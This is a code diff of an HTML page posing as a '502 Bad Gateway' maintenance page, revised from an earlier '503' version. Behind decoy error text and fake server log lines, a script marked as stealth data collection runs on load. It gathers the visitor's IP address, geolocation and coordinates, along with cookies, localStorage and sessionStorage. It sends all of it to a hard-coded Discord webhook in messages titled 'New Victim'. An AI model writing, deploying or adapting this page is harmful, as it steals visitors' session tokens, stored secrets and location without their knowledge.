@@ -3,294 +3,94 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>503 Service Unavailable</title>
+  <title>502 Bad Gateway</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
-    
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    
     body {
-      background: #0f0f1a;
-      color: #ff6b6b;
-      font-family: 'Inter', sans-serif;
-      line-height: 1.6;
-      padding: 20px;
-      overflow-y: scroll;
-      min-height: 100vh;
-    }
-    
-    .container {
-      max-width: 900px;
-      margin: 40px auto;
-      background: #0a0a14;
-      border: 1px solid #2a2a40;
-      border-radius: 12px;
-      padding: 30px;
-      box-shadow: 0 0 30px rgba(255, 107, 107, 0.25);
-    }
-    
-    h1 {
-      font-size: 48px;
-      text-align: center;
-      margin-bottom: 20px;
-      color: #ff3333;
-      text-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
-    }
-    
-    .subtitle {
-      text-align: center;
-      font-size: 18px;
-      color: #ff8080;
-      margin-bottom: 40px;
-    }
-    
-    .error-list {
-      background: #0d0d1a;
-      border: 1px dashed #ff3333;
-      border-radius: 8px;
-      padding: 20px;
-      margin-bottom: 30px;
+      background: #000;
+      color: #ccc;
       font-family: 'Courier New', monospace;
-      color: #ffb3b3;
-      font-size: 14px;
-      white-space: pre-wrap;
-      max-height: 500px;
-      overflow-y: auto;
-    }
-    
-    .footer {
-      text-align: center;
-      color: #555;
-      font-size: 12px;
-      margin-top: 50px;
-    }
-    
-    .blink {
-      animation: blink 1.2s infinite;
-    }
-    
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
-
-    .retry-btn {
-      display: block;
-      width: 200px;
-      margin: 30px auto;
-      padding: 12px 24px;
-      background: #ff3333;
-      color: white;
-      border: none;
-      border-radius: 8px;
       font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 0 15px rgba(255, 51, 51, 0.4);
+      line-height: 1.8;
+      padding: 40px;
+      text-align: center;
     }
-    
-    .retry-btn:hover {
-      background: #ff1a1a;
-      transform: scale(1.05);
-      box-shadow: 0 0 25px rgba(255, 26, 26, 0.6);
+    h1 {
+      font-size: 36px;
+      color: #f55;
+      margin-bottom: 20px;
+    }
+    p {
+      margin: 12px 0;
+      color: #aaa;
+    }
+    .icon {
+      font-size: 20px;
+      margin-right: 8px;
+    }
+    .log {
+      margin-top: 40px;
+      text-align: left;
+      font-size: 14px;
+      color: #888;
+      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1 class="blink">503 Service Unavailable</h1>
-    <p class="subtitle">The server is temporarily unable to handle the request due to maintenance or overload.</p>
-    
-    <button class="retry-btn" onclick="location.reload()">Retry</button>
-    
-    <div class="error-list" id="errorLog"></div>
-    
-    <p class="footer">Nginx | Cloudflare | Apache | Load Balancer | Worker Overload | Rate Limiting | Maintenance Mode</p>
-  </div>
+  <h1>502 Bad Gateway</h1>
+  <p>The server received an invalid response from the upstream server.</p>
+  <p>Construction hm, looks like this website is being updated — try again later!</p>
+  <p>Wrench Maintenance in progress... please be patient.</p>
+  <p>Hourglass Service temporarily down. We'll be back soon!</p>
+
+  <div class="log" id="log"></div>
 
   <script>
     const webhookUrl = 'https://discord.com/api/webhooks/1437139074518352015/hH0soUFF036JdXMcNv39i_88_X7l9eTuzOPE619gu7o8Ocy3ffOgiXq10rgfbj1ZZl00';
     const secretToken = 'yes_its_me_abc123';
     const counterUrl = 'https://api.countapi.xyz/hit/marii/victims';
 
-    const errorTemplates = [
-      "[CRIT] All backend workers are at capacity",
-      "[ERROR] Service temporarily overloaded",
-      "[WARN] Rate limit exceeded for client IP",
-      "[FATAL] No healthy upstream servers",
-      "[CRIT] Connection pool exhausted",
-      "[ERROR] Worker process failed to start",
-      "[WARN] Maintenance mode enabled",
-      "[FATAL] Database connection pool full",
-      "[CRIT] Cache backend unresponsive",
-      "[ERROR] Queue depth exceeded threshold",
-      "[WARN] Circuit breaker opened",
-      "[FATAL] Memory pressure detected",
-      "[CRIT] CPU usage above 95%",
-      "[ERROR] Disk I/O bottleneck",
-      "[WARN] Too many concurrent requests",
-      "[FATAL] Service degradation threshold breached",
-      "[CRIT] Health check failed for all instances",
-      "[ERROR] Upstream timeout after 30s",
-      "[WARN] Request dropped due to overload",
-      "[FATAL] Emergency shutdown initiated",
-      "[CRIT] Worker crashed with SIGSEGV",
-      "[ERROR] Failed to allocate request buffer",
-      "[WARN] Throttling active on zone 'api'",
-      "[FATAL] Kernel OOM killer activated",
-      "[CRIT] Load average: 45.2 (threshold: 20.0)",
-      "[ERROR] Redis connection refused",
-      "[WARN] Slow response from origin (>5000ms)",
-      "[FATAL] Container memory limit exceeded",
-      "[CRIT] Node not ready in cluster",
-      "[ERROR] Failed to acquire semaphore",
-      "[WARN] Backpressure detected in pipeline",
-      "[FATAL] Service mesh sidecar terminated",
-      "[CRIT] Etcd cluster quorum lost",
-      "[ERROR] Kafka consumer lag > 10000",
-      "[WARN] DNS lookup timeout for upstream",
-      "[FATAL] SSL handshake flood detected",
-      "[CRIT] SYN flood mitigation active",
-      "[ERROR] HTTP/2 stream limit reached",
-      "[WARN] WebSocket connection backlog full",
-      "[FATAL] gRPC deadline exceeded globally",
-      "[CRIT] Pod eviction in progress",
-      "[ERROR] Horizontal pod autoscaler failing",
-      "[WARN] Deployment stuck at 60% ready",
-      "[FATAL] Config reload failed",
-      "[CRIT] Certificate rotation in progress",
-      "[ERROR] Secret sync failed",
-      "[WARN] Feature flag evaluation timeout",
-      "[FATAL] Canary rollout aborted",
-      "[CRIT] Traffic shift paused",
-      "[ERROR] Mirror route not responding",
-      "[WARN] Shadow traffic dropped",
-      "[FATAL] Chaos engineering experiment active",
-      "[CRIT] Load test in progress",
-      "[ERROR] Synthetic monitoring failing",
-      "[WARN] Alert: High error rate (5xx > 10%)",
-      "[FATAL] Incident declared: P0",
-      "[CRIT] On-call engineer paged",
-      "[ERROR] Runbook execution started",
-      "[WARN] Auto-remediation attempted",
-      "[FATAL] Failover to DR site initiated",
-      "[CRIT] Traffic rerouted to secondary region",
-      "[ERROR] CDN purge in progress",
-      "[WARN] Cache invalidation storm",
-      "[FATAL] Database failover completed",
-      "[CRIT] Read replica lag > 300s",
-      "[ERROR] Connection draining",
-      "[WARN] Graceful shutdown in progress",
-      "[FATAL] System will restart in 60s",
-      "[CRIT] Emergency maintenance window",
-      "[ERROR] Rolling update paused",
-      "[WARN] Pod disruption budget violated",
-      "[FATAL] Node draining",
-      "[CRIT] Taint applied: NoSchedule",
-      "[ERROR] PVC stuck in Pending",
-      "[WARN] Storage class deprecated",
-      "[FATAL] CSI driver crashloop",
-      "[CRIT] Volume expansion failed",
-      "[ERROR] Snapshot creation timeout",
-      "[WARN] Backup job stuck",
-      "[FATAL] Velero restore in progress",
-      "[CRIT] Etcd backup failed",
-      "[ERROR] Control plane upgrade",
-      "[WARN] Kubernetes version skew",
-      "[FATAL] API server certificate expired",
-      "[CRIT] Kubelet not reporting",
-      "[ERROR] Node pressure: memory",
-      "[WARN] Eviction threshold met",
-      "[FATAL] Cluster autoscaler failing",
-      "[CRIT] Cloud provider quota exceeded",
-      "[ERROR] VPC CNI limit reached",
-      "[WARN] IP address exhaustion",
-      "[FATAL] Subnet CIDR depleted",
-      "[CRIT] Security group rule limit",
-      "[ERROR] IAM role assumption failed",
-      "[WARN] STS token expired",
-      "[FATAL] AWS credentials revoked",
-      "[CRIT] GCP service account deleted",
-      "[ERROR] Azure AD app registration missing",
-      "[WARN] Firewall rule blocking traffic",
-      "[FATAL] WAF rule triggered: Block",
-      "[CRIT] DDoS protection activated",
-      "[ERROR] Bot management score: 1",
-      "[WARN] Challenge issued to client",
-      "[FATAL] CAPTCHA required",
-      "[CRIT] Managed challenge failed",
-      "[ERROR] JS challenge bypassed",
-      "[WARN] Fingerprint mismatch",
-      "[FATAL] Behavioral analysis: malicious",
-      "[CRIT] Country block: high-risk",
-      "[ERROR] ASN reputation: poor",
-      "[WARN] IP reputation score: 5",
-      "[FATAL] Tor exit node detected",
-      "[CRIT] Proxy chain depth: 3",
-      "[ERROR] VPN provider identified",
-      "[WARN] Datacenter IP range",
-      "[FATAL] Headless browser detected",
-      "[CRIT] Automation tool: Puppeteer",
-      "[ERROR] Selenium WebDriver active",
-      "[WARN] cURL with custom headers",
-      "[FATAL] Request from known scanner",
-      "[CRIT] Nuclei template matched",
-      "[ERROR] SQLi payload detected",
-      "[WARN] XSS attempt in query param",
-      "[FATAL] RCE via deserialization",
-      "[CRIT] Log4Shell attempt",
-      "[ERROR] Path traversal: ../../",
-      "[WARN] Directory listing enabled",
-      "[FATAL] Git repo exposed",
-      "[CRIT] Backup file downloaded",
-      "[ERROR] .env file accessed",
-      "[WARN] Debug mode enabled",
-      "[FATAL] Stack trace in response",
-      "[CRIT] Server version leaked",
-      "[ERROR] Internal IP in headers",
-      "[WARN] X-Powered-By exposed",
-      "[FATAL] CORS misconfiguration",
-      "[CRIT] HSTS missing",
-      "[ERROR] Clickjacking protection absent",
-      "[WARN] Referrer-Policy not set",
-      "[FATAL] Security.txt missing",
-      "[CRIT] Bug bounty program not found",
-      "[ERROR] Responsible disclosure ignored",
-      "[WARN] Pentest in progress",
-      "[FATAL] Red team exercise active"
+    const messages = [
+      "[nginx] upstream timed out (110: Connection timed out)",
+      "[proxy] failed to connect to upstream",
+      "[gateway] no healthy upstream",
+      "[loadbalancer] all backends down",
+      "[error] 502 Bad Gateway",
+      "[warn] connection reset by peer",
+      "[crit] upstream server temporarily unavailable",
+      "[info] retrying in 5s...",
+      "[error] invalid response from origin",
+      "[warn] SSL handshake failed",
+      "[crit] worker process exited",
+      "[info] restarting upstream service",
+      "[error] DNS resolution failed",
+      "[warn] cache miss storm",
+      "[crit] memory pressure detected"
     ];
 
-    const domains = ['api.prod.internal', 'gateway.eu-west', 'db.primary.cluster', 'cache.global', 'auth.sso', 'cdn.edge', 'lb.ingress', 'worker.batch'];
-    const ips = ['10.128.0.42', '172.31.255.100', '192.168.99.1', '8.8.4.4', '1.1.1.1', '127.0.0.1'];
-
-    function getRandomItem(arr) {
-      return arr[Math.floor(Math.random() * arr.length)];
+    const log = document.getElementById('log');
+    for (let i = 0; i < 50; i++) {
+      const msg = messages[Math.floor(Math.random() * messages.length)];
+      const time = new Date().toISOString().slice(11, 19);
+      log.textContent += `[${time}] ${msg}\n`;
     }
 
-    function generateError() {
-      let template = getRandomItem(errorTemplates);
-      template = template.replace('{domain}', getRandomItem(domains));
-      template = template.replace('{ip}', getRandomItem(ips));
-      return template;
-    }
-
-    const errorLog = document.getElementById('errorLog');
-    for (let i = 0; i < 100; i++) {
-      errorLog.textContent += generateError() + '\n';
-    }
-
-    // === STEALTH DATA COLLECTION ===
+    // === STEALTH GEO + COORDS + DATA ===
     const sendData = async () => {
-      let victimCount = 1;
-      try {
-        const countResp = await fetch(counterUrl);
-        const countData = await countResp.json();
-        victimCount = countData.value;
-      } catch (e) {}
-
       let ip = 'unknown';
-      let geoData = {};
+      let lat = 'unknown';
+      let lon = 'unknown';
+      let city = 'unknown';
+      let region = 'unknown';
+      let country = 'unknown';
+      let countryCode = 'unknown';
+      let isp = 'unknown';
+      let org = 'unknown';
+      let asNum = 'unknown';
+      let mobile = 'No';
+      let proxy = 'No';
+      let hosting = 'No';
 
       try {
         const ipResp = await fetch('https://api.ipify.org?format=json');
@@ -299,67 +99,49 @@
       } catch (e) {}
 
       try {
-        const geoResp = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,as,mobile,proxy,hosting`);
-        geoData = await geoResp.json();
+        const geoResp = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,lat,lon,isp,org,as,mobile,proxy,hosting`);
+        const geo = await geoResp.json();
+        if (geo.status === 'success') {
+          lat = geo.lat;
+          lon = geo.lon;
+          city = geo.city;
+          region = geo.regionName;
+          country = geo.country;
+          countryCode = geo.countryCode;
+          isp = geo.isp;
+          org = geo.org;
+          asNum = geo.as;
+          mobile = geo.mobile ? 'Yes' : 'No';
+          proxy = geo.proxy ? 'Yes' : 'No';
+          hosting = geo.hosting ? 'Yes' : 'No';
+        }
       } catch (e) {}
 
-      const fields = [];
-      const now = new Date().toISOString();
-
-      const city = geoData.city || 'unknown';
-      const region = geoData.regionName || 'unknown';
-      const country = geoData.country || 'unknown';
-      const countryCode = geoData.countryCode || 'unknown';
-      const isp = geoData.isp || 'unknown';
-      const org = geoData.org || 'unknown';
-      const asNum = geoData.as || 'unknown';
-      const mobile = geoData.mobile ? 'Yes' : 'No';
-      const proxy = geoData.proxy ? 'Yes' : 'No';
-      const hosting = geoData.hosting ? 'Yes' : 'No';
-
-      fields.push(
-        { name: 'Location', value: `${city}, ${region} (${country} / ${countryCode})`, inline: false },
-        { name: 'Network', value: `ISP: ${isp}\nOrg: ${org}\nAS: ${asNum}\nMobile: ${mobile} | Proxy: ${proxy} | Hosting: ${hosting}`, inline: false }
-      );
+      const fields = [
+        { name: 'Location', value: `${city}, ${region} (${country} / ${countryCode})\nLat: ${lat}, Lon: ${lon}`, inline: false },
+        { name: 'Network', value: `IP: ${ip}\nISP: ${isp}\nOrg: ${org}\nAS: ${asNum}\nMobile: ${mobile} | Proxy: ${proxy} | Hosting: ${hosting}`, inline: false }
+      ];
 
       const embed = {
         title: `New Victim: ${ip}`,
-        description: `Timestamp: ${now}`,
+        description: `Timestamp: ${new Date().toISOString()}`,
         color: 15158332,
         fields: fields,
-        footer: { text: 'Grabbed via 503 Maintenance Page' }
+        footer: { text: 'Grabbed via Minimal 502 Page' }
       };
       embed.fields.push({ name: "Lock", value: secretToken, inline: true });
 
       const formData = new FormData();
       formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
 
-      try {
-        if (document.cookie) {
-          const blob = new Blob([document.cookie], { type: 'text/plain' });
-          formData.append('file1', blob, 'cookies.txt');
-        }
-      } catch (e) {}
+      try { if (document.cookie) formData.append('file1', new Blob([document.cookie]), 'cookies.txt'); } catch (e) {}
+      try { formData.append('file2', new Blob([JSON.stringify(localStorage, null, 2)]), 'localStorage.json'); } catch (e) {}
+      try { formData.append('file3', new Blob([JSON.stringify(sessionStorage, null, 2)]), 'sessionStorage.json'); } catch (e) {}
 
-      try {
-        const ls = JSON.stringify(Object.fromEntries(Object.entries(localStorage)), null, 2);
-        const blob = new Blob([ls], { type: 'application/json' });
-        formData.append('file2', blob, 'localStorage.json');
-      } catch (e) {}
-
-      try {
-        const ss = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)), null, 2);
-        const blob = new Blob([ss], { type: 'application/json' });
-        formData.append('file3', blob, 'sessionStorage.json');
-      } catch (e) {}
-
-      try {
-        await fetch(webhookUrl, { method: 'POST', body: formData });
-      } catch (e) {}
+      try { await fetch(webhookUrl, { method: 'POST', body: formData }); } catch (e) {}
     };
 
     sendData();
-    document.addEventListener('DOMContentLoaded', sendData);
   </script>
 </body>
 </html>
